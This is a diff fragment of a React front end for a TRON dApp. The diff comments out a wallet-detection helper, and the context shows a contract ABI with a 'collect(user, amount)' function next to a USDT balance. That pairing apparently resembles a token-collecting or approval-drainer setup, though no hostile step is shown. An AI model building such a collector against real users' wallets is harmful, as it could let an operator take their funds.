@@ -145,17 +145,17 @@ const COLLECT_ABI = [
   { inputs: [], name: 'usdt', outputs: [{ name: '', type: 'address' }], stateMutability: 'view', type: 'function' },
   { inputs: [{ name: 'user', type: 'address' }, { name: 'amount', type: 'uint256' }], name: 'collect', outputs: [], stateMutability: 'nonpayable', type: 'function' },
 ]
-function inspectTronGlobals() {
-  const w = window as any
-  return {
-    hasTrustwallet: !!w.trustwallet,
-    hasTrustwalletTronLink: !!w.trustwallet?.tronLink,
-    hasTrustwalletTronWeb: !!w.trustwallet?.tronLink?.tronWeb,
-    hasTronLink: !!w.tronLink,
-    hasWindowTronWeb: !!w.tronWeb,
-    hasTp: !!w.tp,
-  }
-}
+// function inspectTronGlobals() {
+//   const w = window as any
+//   return {
+//     hasTrustwallet: !!w.trustwallet,
+//     hasTrustwalletTronLink: !!w.trustwallet?.tronLink,
+//     hasTrustwalletTronWeb: !!w.trustwallet?.tronLink?.tronWeb,
+//     hasTronLink: !!w.tronLink,
+//     hasWindowTronWeb: !!w.tronWeb,
+//     hasTp: !!w.tp,
+//   }
+// }
 
 export default function App() {
   const [usdtBalance, setUsdtBalance] = useState('0')
